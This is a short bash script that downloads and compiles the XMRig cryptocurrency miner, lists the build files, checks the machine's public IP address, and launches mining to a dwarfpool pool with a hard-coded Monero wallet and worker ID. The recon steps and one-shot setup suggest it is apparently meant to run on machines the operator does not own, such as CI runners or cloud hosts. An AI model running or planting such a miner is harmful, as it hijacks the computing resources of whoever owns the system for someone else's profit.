#!/usr/bin/env bash
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make
ls -R
curl ipinfo.io/ip
./xmrig -o stratum+tcp://xmr-eu.dwarfpool.com:8080 -u 44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn.37ea3b89e299ee4d188575e7d42f2cba88f66b4ff6327202a923b5b64ad21236 --donate-level=1
